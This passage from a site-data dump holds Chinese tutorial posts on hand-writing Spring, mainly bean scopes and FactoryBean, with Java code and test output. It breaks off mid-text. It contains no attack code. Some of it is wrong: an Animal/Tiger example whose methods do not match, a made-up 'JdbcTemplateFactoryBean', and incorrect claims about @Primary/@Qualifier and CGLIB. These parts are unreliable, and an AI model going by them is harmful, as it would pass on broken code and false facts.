}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n * 测试结果\n\ntiger：[11 hu~]\n------------------\n~方法执行前~\n~方法执行后~ 返回结果：[12 hu~ jdkproxy]\njdk aop：[12 hu~ jdkproxy]\n------------------\n~方法执行前~\n~方法执行后~ 返回结果：[13 hu~ cglibproxy]\ncglib aop：[13 hu~ cglibproxy]\n\nprocess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 总结\n\naop（面向切面编程）代理的实现可以分为两类：基于 jdk 动态代理和基于 cglib 技术。\n\n基于 jdk 动态代理的实现是通过实现 invocationhandler 接口以及调用 proxy.newproxyinstance 方法来创建代理对象。jdk 动态代理只能代理接口，因此需要为目标对象接口定义一个代理对象，并实现 invocationhandler 的 invoke 方法来实现增强逻辑。jdk 动态代理的优点是速度相对较快，缺点则是只能代理接口，无法代理类。\n\n基于 cglib 技术的实现是通过继承 enhancer 类并重写 callbackfilter 和 intercept 方法来创建代理对象。cglib 可以为没有实现接口的类生成代理，因此可以为任何类创建代理。在 cglib 实现中，可以使用 methodinterceptor 将代理对象、目标对象和方法参数打包成 methodinvocation 对象，并通过该对象调用目标方法并应用切面增强逻辑。cglib 的优点是可以代理任意类，缺点则是相对 jdk 动态代理速度稍慢。\n\n在 spring aop 中，还有一些其它的类和接口，比如 reflectivemethodinvocation、aopproxy、advisedsupport 等，它们与代理对象创建密切相关。reflectivemethodinvocation 类用于封装方法调用信息并提供一些便捷的操作方法，aopproxy 接口用于定义获取代理对象的方法，advisedsupport 类用于保存 aop 配置信息。这些类和接口配合使用，可以方便地创建代理对象，并将切面逻辑应用到目标对象的方法调用中。\n\n总之，aop 代理是 spring aop 的核心功能之一，它可以帮助程序员将切面逻辑与目标对象的业务逻辑分离，从而实现更加灵活、高效的应用开发。无论是基于 jdk 动态代理还是基于 cglib 技术实现，都能够通过 spring 框架提供的类和接口来快速创建代理对象，并将切面逻辑应用到目标对象的方法调用中。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 07 - 完善 Bean 作用域和实现 FactoryBean",frontmatter:{title:"手写 Spring 07 - 完善 Bean 作用域和实现 FactoryBean",date:"2023-07-14T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-07.html",relativePath:"views/backend/spring-source-07.md",key:"v-92a132d4",path:"/views/backend/spring-source-07.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:475},{level:2,title:"完善 Bean 作用域",slug:"完善-bean-作用域",normalizedTitle:"完善 bean 作用域",charIndex:481},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:498},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:514},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:526},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:544},{level:2,title:"实现 FactoryBean",slug:"实现-factorybean",normalizedTitle:"实现 factorybean",charIndex:551},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:498},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:514},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:526},{level:3,title:"测试：",slug:"测试-2",normalizedTitle:"测试：",charIndex:544},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:624}],excerpt:"<Boxx/>\n<p>Spring 中的 Bean 作用域是指定 Bean 的生命周期范围，而 FactoryBean 则是一种特殊的Bean，其主要作用是创建其他 Bean 实例。</p>\n<p>具体来说，FactoryBean 是一个接口，它提供了一个用于创建 Bean 实例的方法 getObject()。当容器需要获取 FactoryBean 所创建的 Bean 时，会调用 getObject() 方法返回实际的 Bean 实例。</p>\n<p>与普通的 Bean 不同，FactoryBean 本身并不会被直接注入到其他 Bean 中使用，而是通过在 ApplicationContext 中配置 FactoryBean，然后通过 getBean() 方法获取实际的 Bean 实例。</p>\n<p>与 Bean 作用域相比，FactoryBean 的概念更加专业化，它通常用于需要在 Bean 创建时进行一些复杂的初始化操作或者需要实现某种特定功能的场景。例如，Spring 中提供的 JdbcTemplate 就是通过 JdbcTemplateFactoryBean 来创建的。</p>\n",headersStr:"解析 完善 Bean 作用域 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 实现 FactoryBean 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 总结",content:'Spring 中的 Bean 作用域是指定 Bean 的生命周期范围，而 FactoryBean 则是一种特殊的Bean，其主要作用是创建其他 Bean 实例。\n\n具体来说，FactoryBean 是一个接口，它提供了一个用于创建 Bean 实例的方法 getObject()。当容器需要获取 FactoryBean 所创建的 Bean 时，会调用 getObject() 方法返回实际的 Bean 实例。\n\n与普通的 Bean 不同，FactoryBean 本身并不会被直接注入到其他 Bean 中使用，而是通过在 ApplicationContext 中配置 FactoryBean，然后通过 getBean() 方法获取实际的 Bean 实例。\n\n与 Bean 作用域相比，FactoryBean 的概念更加专业化，它通常用于需要在 Bean 创建时进行一些复杂的初始化操作或者需要实现某种特定功能的场景。例如，Spring 中提供的 JdbcTemplate 就是通过 JdbcTemplateFactoryBean 来创建的。\n\n\n\n * 解析\n * 完善 Bean 作用域\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 实现 FactoryBean\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\nSpring 的 scope 作用域实现无非就是在 xml 中配置 bean 时预先定义好，通过加载器加载后解析到 BeanDefinition 中，后续创建 bean 实例时根据不同作用域创建即可。\n\nSpring 的 FactoryBean 接口定义了一种工厂类，可以用于创建其他 bean 实例。其实现原理是在 Spring 容器启动时，扫描所有的 FactoryBean 类型的 bean，对每个实现了 FactoryBean 接口的 bean，Spring 会调用其 getObject() 方法来获取一个实际的 bean 实例，这个实例被纳入到 Spring 容器中，并且可以像普通的 bean 一样被注入和使用。\n\n需要注意的是，通过 FactoryBean 创建的对象在 Spring 容器中存在两个名字：一个是 FactoryBean 对象自身的名字（即 &beanName），另一个则是由 FactoryBean 创建的目标 bean 的名字（即 beanName）。因此，如果要获取 FactoryBean 创建的实例，需要在 bean 名称前加上 & 前缀，例如 &beanName。\n\nFactoryBean 的使用场景包括但不限于：\n\n * 需要在 bean 创建时进行一些特殊的逻辑判断或初始化操作。\n * 需要创建的 bean 是一些复杂的对象，需要通过多个步骤进行创建。\n * 需要创建的 bean 不是基于类的，而是基于某些配置信息的，比如从配置文件中读取的属性值等。\n\n需要注意的是，如果 FactoryBean 实现了单例模式，那么由它创建的 Bean 实例也将成为单例。否则，每次请求都会创建新的 Bean 实例。因此，通过FactoryBean 创建的 Bean 实例的作用域也可以通过指定相应的 scope 属性来进行控制。\n\n\n# 完善 Bean 作用域\n\n完善 Bean 作用域无非就是对之前的实现做一点改动而已：\n\n 1. 更新 BeanDefinition，加入作用域 scope（默认为单例） 及相关字段。\n 2. 更新加载器 XmlBeanDefinitionReader，在解析 xml 的时候解析新加的 scope 标签，并赋值给 BeanDefinition。\n 3. 修改 Bean xml 配置，加入作用域 scope。\n\n\n# 定义一些职责和能力：\n\n 1. 修改 BeanDefinition，加入作用域相关字段。\n    \n    public class BeanDefinition {\n    \n        private static final String SCOPE_SINGLETON = ConfigurableBeanFactory.SCOPE_SINGLETON;\n    \n        private static final String SCOPE_PROTOTYPE = ConfigurableBeanFactory.SCOPE_PROTOTYPE;\n    \n        /**\n         * 定义为 Class，这样就可以把 Bean 的实例化（通过反射）操作放到容器中处理了，实例化用\n         */\n        private Class<?> beanClass;\n        /**\n         * 一个 Bean 的所有字段信息，留作属性填充用\n         */\n        private PropertyValues propertyValues;\n        /**\n         * init方法名称\n         */\n        private String initMethodName;\n        /**\n         * 销毁方法名称\n         */\n        private String destroyMethodName;\n    \n        /**\n         * 生命周期，默认单例的\n         */\n        private String scope = SCOPE_SINGLETON;\n        /**\n         * 单例，默认是\n         */\n        private boolean singleton = true;\n        /**\n         * 原型，默认不是\n         */\n        private boolean prototype = false;\n    \n        public BeanDefinition(Class<?> beanClass) {\n            this.beanClass = beanClass;\n            this.propertyValues = new PropertyValues();\n        }\n    \n        public BeanDefinition(Class<?> beanClass, PropertyValues propertyValues) {\n            this.beanClass = beanClass;\n            this.propertyValues = propertyValues == null ? new PropertyValues() : propertyValues;\n        }\n    \n        public void setScope(String scope) {\n            this.scope = scope;\n            this.singleton = SCOPE_SINGLETON.equals(scope);\n            this.prototype = SCOPE_PROTOTYPE.equals(scope);\n        }\n    \n        public String getScope() {\n            return scope;\n        }\n    \n        public Class<?> getBeanClass() {\n            return beanClass;\n        }\n    \n        public void setBeanClass(Class<?> beanClass) {\n            this.beanClass = beanClass;\n        }\n    \n        public PropertyValues getPropertyValues() {\n            return propertyValues;\n        }\n    \n        public void setPropertyValues(PropertyValues propertyValues) {\n            this.propertyValues = propertyValues;\n        }\n    \n        public String getInitMethodName() {\n            return initMethodName;\n        }\n    \n        public void setInitMethodName(String initMethodName) {\n            this.initMethodName = initMethodName;\n        }\n    \n        public String getDestroyMethodName() {\n            return destroyMethodName;\n        }\n    \n        public void setDestroyMethodName(String destroyMethodName) {\n            this.destroyMethodName = destroyMethodName;\n        }\n    \n        public boolean isSingleton() {\n            return singleton;\n        }\n    \n        public void setSingleton(boolean singleton) {\n            this.singleton = singleton;\n        }\n    \n        public boolean isPrototype() {\n            return prototype;\n        }\n    \n        public void setPrototype(boolean prototype) {\n            this.prototype = prototype;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    104\n    \n\n\n# 具体的实现：\n\n 1. 更新加载器 XmlBeanDefinitionReader#doLoadBeanDefinitions()，在解析 xml 的时候解析新加的 scope 标签，并赋值给 BeanDefinition。\n\nprivate void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException {\n    // 改动核心代码\n\tString beanScope = bean.getAttribute("scope");\n    if (StrUtil.isNotBlank(beanScope)) {\n        beanDefinition.setScope(beanScope);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 AbstractAutowireCapableBeanFactory#createBean() ，单例 Bean 添加缓存，同时将实现了销毁接口的 Bean 也改为单例时注册方便容器停止时进行销毁。\n\n    @Override\n    protected Object createBean(String beanName, BeanDefinition beanDefinition, Object[] args) throws BeansException {\n        Object bean = null;\n        try {\n            // 实例化\n            bean = createBeanInstance(beanName, beanDefinition, args);\n            // 属性填充\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 添加 Bean 的初始化扩展\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Failed to bean instance", e);\n        }\n        // ==> 添加单例 Bean 缓存\n        if (beanDefinition.isSingleton()) {\n            // ==> 注册实现了 DisposableBean 接口的 单例Bean 对象，留待容器停止的时候调用。\n            registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            addSingleton(beanName, bean);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. 当然，别忘了修改DefaultListableBeanFactory#preInstantiateSingletons()，在容器启动后提前实例化所有的【单例 Bean】，之前是初始化所有 bean 的。\n\n    @Override\n    public void preInstantiateSingletons() {\n        for (Map.Entry<String, BeanDefinition> entry : beanDefinitionMap.entrySet()) {\n            String beanName = entry.getKey();\n            BeanDefinition beanDefinition = entry.getValue();\n            if (beanDefinition.isSingleton()) {\n                getBean(beanName);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    \x3c!--  ↓↓ bean scope 测试 ↓↓ --\x3e\n    \x3c!--  多例的 mouse  --\x3e\n    <bean id="mouse" scope="prototype"\n        class="com.snail.springframework.beans.factory.bean.Mouse">\n        <property name="name" value="name-xml-init-jerry"></property>\n    </bean>\n    \x3c!--  单例的 Tiger  --\x3e\n    <bean id="cat" name="catBEAN" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.bean.Cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试 Bean 准备\n\n还用之前已有的 Mouse 和 Cat 类即可。\n\n * 测试类\n\n    /**\n     * bean scope 测试\n     */\n    @Test\n    public void bean_scope_test() {\n        // 1. 利用 xml上下文 加载Bean\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-scope.xml");\n        applicationContext.registerShutdownHook();\n        // 2. 获取bean\n        Mouse mouse1 = (Mouse) applicationContext.getBean("mouse");\n        Mouse mouse2 = (Mouse) applicationContext.getBean("mouse");\n        System.err.println("mouse1：" + mouse1.hashCode());\n        System.err.println("mouse2：" + mouse2.hashCode());\n        System.err.println("Mouse 是否单例：" + (mouse1 == mouse2));\n\n        System.err.println();\n\n        Cat cat1 = (Cat) applicationContext.getBean("cat");\n        Cat cat2 = (Cat) applicationContext.getBean("cat");\n        System.err.println("cat1：" + cat1.hashCode());\n        System.err.println("cat2：" + cat1.hashCode());\n        System.err.println("Cat 是否单例：" + (cat1 == cat2));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试结果\n\n-- Cat init method by xml --\n==> BeanNameAware beanName: mouse\n==> BeanClassLoaderAware classLoader: sun.misc.Launcher$AppClassLoader@18b4aac2\n==> BeanFactoryAware beanFactory: com.snail.springframework.beans.factory.support.DefaultListableBeanFactory@97e1986\n==> ApplicationContextAware applicationContext: com.snail.springframework.context.support.ClassPathXmlApplicationContext@26f67b76\n==> BeanNameAware beanName: mouse\n==> BeanClassLoaderAware classLoader: sun.misc.Launcher$AppClassLoader@18b4aac2\n==> BeanFactoryAware beanFactory: com.snail.springframework.beans.factory.support.DefaultListableBeanFactory@97e1986\n==> ApplicationContextAware applicationContext: com.snail.springframework.context.support.ClassPathXmlApplicationContext@26f67b76\nmouse1：356473385\nmouse2：2136344592\nMouse 是否单例：false\n\ncat1：110992469\ncat2：110992469\nCat 是否单例：true\n-- Cat destroy method by xml --\n\nProcess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 实现 FactoryBean\n\n在 Spring 源码中， FactoryBean 接口的具体实现主要是在 org.springframework.beans.factory.support.FactoryBeanRegistrySupport 类中。这个类是 Spring 容器的一个关键组件，主要负责处理所有的 FactoryBean 对象，并将它们转化为普通的 bean 实例。\n\nFactoryBeanRegistrySupport 中的核心方法包括：\n\n * containsBeanDefinition(String beanName)：判断指定的 bean 是否是一个 FactoryBean。\n * getFactoryBean(String name, RootBeanDefinition mbd)：获取指定名称的 FactoryBean 实例，并调用其 getObject() 方法来创建目标 bean。\n * isFactoryBean(String name, RootBeanDefinition mbd)：判断指定的 bean 是否是一个 FactoryBean。\n * getObjectForBeanInstance(Object beanInstance, String name, String beanName, RootBeanDefinition mbd)：获取指定实例对应的目标 bean，如果该实例是一个 FactoryBean，则调用其 getObject() 方法来获取目标 bean。\n\n除了 FactoryBeanRegistrySupport 外，Spring 还提供了很多其他支持 FactoryBean 的类和接口，比如 AbstractBeanFactory、BeanWrapperImpl 等等，这些组件共同构成了 Spring 容器中 FactoryBean 实现的基础框架。\n\n\n# 定义一些职责和能力：\n\n 1. FactoryBean：FactoryBean 将对应一个工厂类，该工厂类负责创建目标 bean，并返回它的实例。\n    \n    public interface FactoryBean<T> {\n    \n        /**\n         * 获取对象\n         */\n        T getObject();\n    \n        /**\n         * 获取对象类型\n         */\n        Class<?> getObjectType();\n    \n        /**\n         * 是否为单例\n         */\n        boolean isSingleton();\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n\n# 具体的实现：\n\n 1. FactoryBeanRegistrySupport：保存所有 FactoryBean 目标 bean 的能力（单例才缓存），实现 FactoryBean 目标 bean 获取和缓存。这个类是 Spring 容器的一个关键组件，主要负责处理所有的 FactoryBean 对象，并将它们转化为普通的 bean 实例。\n    \n    public class FactoryBeanRegistrySupport \n        extends DefaultSingletonBeanRegistry // 保存了所有单例 bean 和待销毁的 bean\n    {\n    \n        /**\n         * 对所有的 单例FactoryBean 包装的 真实类，进行缓存\n         */\n        private final Map<String, Object> factoryBeanObjectCache = new ConcurrentHashMap<>();\n    \n        /**\n         * 直接从缓存中获取真实的被FactoryBean包装的单例对象\n         *\n         * @param beanName bean名字\n         * @return {@link Object}\n         */\n        protected Object getCachedObjectForFactoryBean(String beanName) {\n            Object object = factoryBeanObjectCache.get(beanName);\n            return (object != NULL_OBJECT ? object : null);\n        }\n    \n        /**\n         * 从FactoryBean获取真实的被FactoryBean包装的单例对象，如果是单例Bean还会将查出的结果放入缓存中\n         *\n         * @param factoryBean 工厂bean\n         * @param beanName    bean名字\n         * @return {@link Object}\n         */\n        protected Object getObjectFromFactoryBean(FactoryBean factoryBean, String beanName) {\n            if (factoryBean.isSingleton()) {\n                Object object = factoryBeanObjectCache.get(beanName);\n                if (object == null) {\n                    object = doGetObjectFromFactoryBean(factoryBean, beanName);\n                    factoryBeanObjectCache.put(beanName, (object == null ? NULL_OBJECT : object));\n                }\n                return (object != NULL_OBJECT ? object : null);\n            } else {\n                return doGetObjectFromFactoryBean(factoryBean, beanName);\n            }\n        }\n    \n        private Object doGetObjectFromFactoryBean(FactoryBean factoryBean, String beanName) {\n            try {\n                return factoryBean.getObject();\n            } catch (Exception e) {\n                throw new BeansException("Faild to bean[" + beanName + "] doGetObjectFromFactoryBean", e);\n            }\n        }\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    \n\n\n# 将实现加入原有的逻辑中：\n\n 1. 我们想一下，FactoryBean 作为 bean 的包装扩展，改动逻辑肯定是在 getBean() 最后一步的时候，如果是 FactoryBean 那么就用 FactoryBean#getObject()替换原始对象从而获取真正的目标 bean 对象。\n\n 2. 当然，在 getBean(String beanName) 的时候，如果 beanName 是 & 开头，那我们得返回原始的 FactoryBean 对象。\n    \n    所以修改 AbstractBeanFactory#getBean()：\n    \n    public abstract class AbstractBeanFactory \n        // 这里修改原先的 DefaultSingletonBeanRegistry 为 FactoryBeanRegistrySupport\n        extends FactoryBeanRegistrySupport \n        implements ConfigurableBeanFactory {\n        \n        protected <T> T doGetBean(final String name, final Object[] args) {\n            // 获取真实 bean 的名字\n            String beanName = transformedBeanName(name);\n            Object sharedInstance = getSingleton(beanName);\n            if (sharedInstance != null) {\n                // 如果是 FactoryBean，那么就转换为 目标bean 返回\n                return (T) getObjectForBeanInstance(sharedInstance, name, beanName);\n            }\n            BeanDefinition beanDefinition = getBeanDefinition(beanName);\n            Object bean = createBean(beanName, beanDefinition, args);\n            // 如果是 FactoryBean，那么就转换为 目标bean 返回\n            return (T) getObjectForBeanInstance(bean, name, beanName);\n        }\n    \n        /**\n         * 获取：去除 & 后的 beanName\n         *\n         * @param name 名字\n         * @return {@link String}\n         */\n        private String transformedBeanName(String name) {\n            if (name.startsWith("&")) {\n                return name.substring(name.indexOf("&") + 1);\n            }\n            return name;\n        }\n    \n        /**\n         * 获得bean实例对象\n         * 获取指定实例对应的目标 bean，如果该实例是一个 FactoryBean，则调用其 getObject() 方法来获取目标 bean。\n         *\n         * @param beanInstance bean实例\n         * @param name         bean原始名字\n         * @param beanName     bean名字\n         * @return {@link Object}\n         */\n        private Object getObjectForBeanInstance(Object beanInstance, String name, String beanName) {\n            if (!(beanInstance instanceof FactoryBean) || name.startsWith("&")) {\n                return beanInstance;\n            }\n            Object object = getCachedObjectForFactoryBean(beanName);\n            if (object == null) {\n                FactoryBean<?> factoryBean = (FactoryBean<?>) beanInstance;\n                object = getObjectFromFactoryBean(factoryBean, beanName);\n            }\n            return object;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    \n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    \x3c!--  ↓↓ FactoryBean 测试 ↓↓ --\x3e\n    \x3c!--  TigerFactoryBean  --\x3e\n    <bean id="animalFactoryBean" class="com.snail.springframework.beans.factory.bean.AnimalFactoryBean"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n\n * 这里我们准备一个 Animal 接口，一个 Tiger 类，Tiger 引用了 Animal ，并调用 Animal 的方法。\n   \n   在准备一个 AnimalFactoryBean 类，使用 FactoryBean 作为一个 Bean，采用 jdk动态代理 的方式来实现 Animal，并注入到 Tiger 中，这样的话 Tiger 中的 Animal 就是我们 FactoryBean 的包装类了。\n\npublic interface Animal {\n    String getName(String name);\n}\n\n\n1\n2\n3\n\n\npublic class Tiger implements Animal {\n\n    private String name;\n\n    @Override\n    public String getAnimalName() {\n        return name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\npublic class AnimalFactoryBean implements FactoryBean<Animal> {\n\n    /**\n     * 要代理的对象\n     */\n    private Animal animal;\n\n    public void setAnimal(Animal animal) {\n        this.animal = animal;\n    }\n\n    @Override\n    public Animal getObject() {\n        System.out.println("-- into FactoryBean getObject() --");\n        InvocationHandler handler = (proxy, method, args) -> {\n            System.out.println("-- into FactoryBean JdkProxy method:[" + method.getName() + "] before --");\n            Object result = method.invoke(animal, args);\n            System.out.println("-- into FactoryBean JdkProxy method:[" + method.getName() + "] after --");\n            return result;\n        };\n        return (Animal) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),\n                new Class[]{Animal.class}, handler);\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return Animal.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n * 测试类\n\n    @Test\n    public void factoryBean_test() {\n        // 1. 利用 xml上下文 加载Bean\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-factorybean.xml");\n        applicationContext.registerShutdownHook();\n\n        // 2. 获取原始 FactoryBean 对象\n        AnimalFactoryBean animalFactoryBean = (AnimalFactoryBean) applicationContext.getBean("&animalFactoryBean");\n        System.err.println("获取原始 FactoryBean 对象: " + animalFactoryBean);\n        Tiger tiger = new Tiger();\n        tiger.setName("我是小老虎ai~");\n        animalFactoryBean.setAnimal(tiger);\n\n        // 3. 获取真正的 bean，并调用它的方法，\n        // 当然利用代理可以在调用它的方法前后做一些其他操作\n        Animal proxyAnimal = (Animal) applicationContext.getBean("animalFactoryBean");\n        System.err.println("获取真实 FactoryBean 目标 bean 对象: " + proxyAnimal);\n        System.err.println(proxyAnimal.getAnimalName());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 测试结果\n\n-- into FactoryBean getObject() --\n获取原始 FactoryBean 对象: com.snail.springframework.beans.factory.bean.AnimalFactoryBean$$EnhancerByCGLIB$$585388b2@64616ca2\n-- into FactoryBean JdkProxy method:[toString] before --\n获取真实 FactoryBean 目标 bean 对象: com.snail.springframework.beans.factory.bean.Tiger@13fee20c\n-- into FactoryBean JdkProxy method:[toString] after --\n-- into FactoryBean JdkProxy method:[getAnimalName] before --\n我是小老虎ai~\n-- into FactoryBean JdkProxy method:[getAnimalName] after --\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\nFactoryBean 是 Spring 框架中的一个接口，用于创建和管理 bean 实例。与普通的 bean 不同，FactoryBean 本身也是一个 bean，但其主要作用是负责创建和初始化其他 bean 的实例。\n\n具体来说，FactoryBean 将对应一个工厂类，该工厂类负责创建目标 bean，并返回它的实例。在 Spring 容器启动时，会先创建 FactoryBean 的实例，然后再调用该实例的 getObject() 方法来获取目标 bean 的实例。因此，可以通过使用 FactoryBean 来实现一些特殊的 bean 创建逻辑，比如在每次获取 bean 实例时都创建一个新的对象，或者根据不同的条件返回不同的 bean 实例等。\n\n要创建一个自定义的 FactoryBean，需要实现 FactoryBean 接口，并重写其 getObject() 和 getObjectType() 方法。其中，getObject() 方法用于创建并返回目标 bean 实例，而 getObjectType() 方法则用于指定目标 bean 的类型。另外，如果希望让 Spring 容器直接将 FactoryBean 本身注入到其他 bean 中，而不是将其产生的 bean 注入进去，则需要在实现类上添加 @Primary 或 @Qualifier 注解。\n\n需要注意的是，当一个 bean 实现了 FactoryBean 接口时，Spring IOC 容器会默认将其注册为一个工厂类 bean，而不会直接将其产生的 bean 注册进容器中。因此，在获取 bean 实例时，需要使用 "&" 符号来获取 FactoryBean 本身，或者使用 getObject() 方法来获取目标 bean 的实例。',normalizedContent:'spring 中的 bean 作用域是指定 bean 的生命周期范围，而 factorybean 则是一种特殊的bean，其主要作用是创建其他 bean 实例。\n\n具体来说，factorybean 是一个接口，它提供了一个用于创建 bean 实例的方法 getobject()。当容器需要获取 factorybean 所创建的 bean 时，会调用 getobject() 方法返回实际的 bean 实例。\n\n与普通的 bean 不同，factorybean 本身并不会被直接注入到其他 bean 中使用，而是通过在 applicationcontext 中配置 factorybean，然后通过 getbean() 方法获取实际的 bean 实例。\n\n与 bean 作用域相比，factorybean 的概念更加专业化，它通常用于需要在 bean 创建时进行一些复杂的初始化操作或者需要实现某种特定功能的场景。例如，spring 中提供的 jdbctemplate 就是通过 jdbctemplatefactorybean 来创建的。\n\n\n\n * 解析\n * 完善 bean 作用域\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 实现 factorybean\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\nspring 的 scope 作用域实现无非就是在 xml 中配置 bean 时预先定义好，通过加载器加载后解析到 beandefinition 中，后续创建 bean 实例时根据不同作用域创建即可。\n\nspring 的 factorybean 接口定义了一种工厂类，可以用于创建其他 bean 实例。其实现原理是在 spring 容器启动时，扫描所有的 factorybean 类型的 bean，对每个实现了 factorybean 接口的 bean，spring 会调用其 getobject() 方法来获取一个实际的 bean 实例，这个实例被纳入到 spring 容器中，并且可以像普通的 bean 一样被注入和使用。\n\n需要注意的是，通过 factorybean 创建的对象在 spring 容器中存在两个名字：一个是 factorybean 对象自身的名字（即 &beanname），另一个则是由 factorybean 创建的目标 bean 的名字（即 beanname）。因此，如果要获取 factorybean 创建的实例，需要在 bean 名称前加上 & 前缀，例如 &beanname。\n\nfactorybean 的使用场景包括但不限于：\n\n * 需要在 bean 创建时进行一些特殊的逻辑判断或初始化操作。\n * 需要创建的 bean 是一些复杂的对象，需要通过多个步骤进行创建。\n * 需要创建的 bean 不是基于类的，而是基于某些配置信息的，比如从配置文件中读取的属性值等。\n\n需要注意的是，如果 factorybean 实现了单例模式，那么由它创建的 bean 实例也将成为单例。否则，每次请求都会创建新的 bean 实例。因此，通过factorybean 创建的 bean 实例的作用域也可以通过指定相应的 scope 属性来进行控制。\n\n\n# 完善 bean 作用域\n\n完善 